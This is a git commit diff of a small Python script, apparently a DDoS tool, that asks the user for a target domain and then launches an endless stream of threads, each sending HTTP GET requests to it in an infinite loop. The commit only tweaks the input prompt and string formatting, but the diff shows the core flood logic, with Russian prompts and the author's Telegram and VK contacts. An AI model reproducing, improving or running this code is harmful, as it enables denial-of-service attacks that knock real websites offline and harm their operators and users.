bf894aaa65f7b91b7b6b619e133720700e37c84b
soketpy <102751318+soketpy@users.noreply.github.com>
2022-04-10 00:46:14 +0300

    Update fuckdosmob.py

--- fuckdosmob.py
+++ fuckdosmob.py
@@ -16,12 +16,12 @@ print(Fore.RED + """
 t.me/soketpy | vk.com/mb_vlad
 
 """)
-ddos = input(Fore.GREEN + "Введите домен: ")
+ddos = input("Введите домен: ")
 input("Нажмите на Enter чтобы начать!")
 
 def dos():
  while True:
-  requests.get(str(ddos))
+  requests.get("%s" % str(ddos))
   
 while True:
  threading.Thread(target=dos).start()
